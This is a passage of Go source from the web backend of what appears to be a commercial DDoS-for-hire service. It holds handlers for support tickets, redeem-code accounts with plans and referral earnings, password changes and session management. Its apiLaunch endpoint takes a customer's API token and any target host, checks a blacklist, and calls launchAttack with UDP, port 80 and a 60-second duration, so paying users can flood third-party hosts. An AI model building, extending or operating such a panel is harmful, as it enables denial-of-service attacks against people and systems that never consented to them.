		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	subject := Sanitize(r.FormValue("subject"))
	category := r.FormValue("category")
	message := Sanitize(r.FormValue("message"))
	tid := generateID()
	msg := []TicketMessage{{Sender: u, Content: message, Time: time.Now().Format("2006-01-02 15:04"), IsAdmin: false}}
	msgJSON, _ := json.Marshal(msg)
	db.Exec("INSERT INTO tickets (id, user_id, category, subject, status, last_update, messages) VALUES (?, ?, ?, ?, ?, ?, ?)", tid, u, category, subject, "Open", time.Now(), string(msgJSON))
	http.Redirect(w, r, "/support", 302)
}

func handleReplyTicket(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	tid := r.FormValue("id")
	message := Sanitize(r.FormValue("message"))
	var msgJSON string
	var status string
	db.QueryRow("SELECT messages, status FROM tickets WHERE id=?", tid).Scan(&msgJSON, &status)
	var msgs []TicketMessage
	json.Unmarshal([]byte(msgJSON), &msgs)
	isAdmin := (u == "admin")
	msgs = append(msgs, TicketMessage{Sender: u, Content: message, Time: time.Now().Format("2006-01-02 15:04"), IsAdmin: isAdmin})
	if isAdmin {
		status = "Answered"
	} else {
		status = "Pending"
	}
	newMsgJSON, _ := json.Marshal(msgs)
	db.Exec("UPDATE tickets SET messages = ?, status = ?, last_update = ? WHERE id = ?", string(newMsgJSON), status, time.Now(), tid)
	if isAdmin {
		http.Redirect(w, r, "/admin?view=tickets&ticket="+tid, 302)
	} else {
		http.Redirect(w, r, "/support?ticket="+tid, 302)
	}
}

func handleNewCaptcha(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte(captcha.New()))
}

func apiLaunch(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	// Prefer Authorization: Bearer <token>. Keep ?token=... temporarily.
	tok := ""
	if ah := r.Header.Get("Authorization"); strings.HasPrefix(ah, "Bearer ") {
		tok = strings.TrimSpace(strings.TrimPrefix(ah, "Bearer "))
	}
	if tok == "" {
		tok = r.URL.Query().Get("token")
	}

	usr, ok := getUserByToken(tok)
	if !ok {
		http.Error(w, "Bad Token", http.StatusForbidden)
		return
	}
	target := Sanitize(r.URL.Query().Get("target"))
	if isBlacklisted(target) {
		http.Error(w, "Target Blacklisted", http.StatusForbidden)
		return
	}
	launchAttack(usr.Username, target, "80", "60", "UDP", "1")
	w.Write([]byte(`{"status":"sent"}`))
}

func handleRedeemLogin(w http.ResponseWriter, r *http.Request) {
	if isRateLimited(getIP(r)) {
		http.Error(w, "Rate Limit", http.StatusTooManyRequests)
		return
	}
	if r.Method != http.MethodPost {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	// CSRF validation (same as login/register)
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}

	code := Sanitize(r.FormValue("code"))
	if code == "" {
		http.Redirect(w, r, "/login?err=invalid_code", http.StatusFound)
		return
	}

	var plan string
	if err := db.QueryRow("SELECT plan FROM redeem_codes WHERE code=? AND used=0", code).Scan(&plan); err != nil {
		http.Redirect(w, r, "/login?err=invalid_code", http.StatusFound)
		return
	}

	// Create a minimal one-time user bound to this redeem code
	// Username pattern: redeem-<id>
	username := "redeem-" + generateID()
	passwd := generateToken()
	hash, err := generatePasswordHash(passwd)
	if err != nil {
		http.Redirect(w, r, "/login?err=1", http.StatusFound)
		return
	}
	refCode := generateToken()[:8]
	apiTok := generateToken()
	userID := "u#" + generateID()

	// Insert user; on rare collision, retry with a different id once
	if _, err := db.Exec("INSERT INTO users (username, password, plan, status, api_token, user_id, balance, ref_code, referred_by, ref_earnings) VALUES (?, ?, ?, 'Active', ?, ?, 0.0, ?, '', 0.0)", username, hash, plan, apiTok, userID, refCode); err != nil {
		// Try one more time
		username = "redeem-" + generateID()
		if _, err2 := db.Exec("INSERT INTO users (username, password, plan, status, api_token, user_id, balance, ref_code, referred_by, ref_earnings) VALUES (?, ?, ?, 'Active', ?, ?, 0.0, ?, '', 0.0)", username, hash, plan, apiTok, userID, refCode); err2 != nil {
			http.Redirect(w, r, "/login?err=1", http.StatusFound)
			return
		}
	}

	// Mark code used only after user has been created
	_, _ = db.Exec("UPDATE redeem_codes SET used=1 WHERE code=?", code)

	token := createSession(username)
	if token == "" {
		http.Redirect(w, r, "/login?err=session", http.StatusFound)
		return
	}
	setSessionCookie(w, r, token, 86400)
	http.Redirect(w, r, "/dashboard?welcome=true", http.StatusFound)
}

// --- PROFILE / ACCOUNT APIs ---

func handleChangePassword(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	if isRateLimited(getIP(r)) {
		http.Error(w, "Rate Limit", http.StatusTooManyRequests)
		return
	}

	var req struct {
		Current string `json:"current"`
		Next    string `json:"next"`
		Confirm string `json:"confirm"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}
	if req.Next == "" || req.Current == "" {
		http.Error(w, "Missing Fields", http.StatusBadRequest)
		return
	}
	if req.Next != req.Confirm {
		http.Error(w, "Password Mismatch", http.StatusBadRequest)
		return
	}
	if len(req.Next) < 8 {
		http.Error(w, "Password Too Short", http.StatusBadRequest)
		return
	}

	var dbHash string
	if err := db.QueryRow("SELECT password FROM users WHERE username=?", username).Scan(&dbHash); err != nil {
		http.Error(w, "User Not Found", http.StatusBadRequest)
		return
	}
	match, _ := comparePasswordAndHash(req.Current, dbHash)
	if !match {
		http.Error(w, "Invalid Current Password", http.StatusForbidden)
		return
	}

	newHash, err := generatePasswordHash(req.Next)
	if err != nil {
		http.Error(w, "Server Error", http.StatusInternalServerError)
		return
	}
	if _, err := db.Exec("UPDATE users SET password=? WHERE username=?", newHash, username); err != nil {
		http.Error(w, "DB Error", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]any{"status": "ok"})
}

func handleRotateToken(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	if isRateLimited(getIP(r)) {
		http.Error(w, "Rate Limit", http.StatusTooManyRequests)
		return
	}

	newTok := generateToken() + generateToken()
	if _, err := db.Exec("UPDATE users SET api_token=? WHERE username=?", newTok, username); err != nil {
		http.Error(w, "DB Error", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "token": newTok})
}

func handleListSessions(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	rows, err := db.Query("SELECT token, COALESCE(created_at,0), COALESCE(last_seen,0), COALESCE(user_agent,''), COALESCE(ip,''), expires FROM sessions WHERE username=? ORDER BY COALESCE(last_seen,0) DESC", username)
	if err != nil {
		http.Error(w, "DB Error", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	out := []SessionInfo{}
	for rows.Next() {
		var s SessionInfo
		_ = rows.Scan(&s.Token, &s.CreatedAt, &s.LastSeen, &s.UserAgent, &s.IP, &s.Expires)
		out = append(out, s)
	}
	json.NewEncoder(w).Encode(out)
}

func handleRevokeSession(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}

	var req struct {
		Token string `json:"token"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Token == "" {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	res, err := db.Exec("DELETE FROM sessions WHERE token=? AND username=?", req.Token, username)
	if err != nil {
		http.Error(w, "DB Error", http.StatusInternalServerError)
		return
	}
	affected, _ := res.RowsAffected()
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "revoked": affected > 0})
}

func handleRevokeAllSessions(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}

	// Keep current session token so user doesn't immediately log themselves out.
	current := ""
	if c, err := r.Cookie(sessionCookieName); err == nil {
		current = c.Value
	}
	if current == "" {
		http.Error(w, "No current session", http.StatusBadRequest)
		return
	}

	res, err := db.Exec("DELETE FROM sessions WHERE username=? AND token<>?", username, current)
	if err != nil {
		http.Error(w, "DB Error", http.StatusInternalServerError)
		return
	}
	affected, _ := res.RowsAffected()
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "revoked": affected})
}
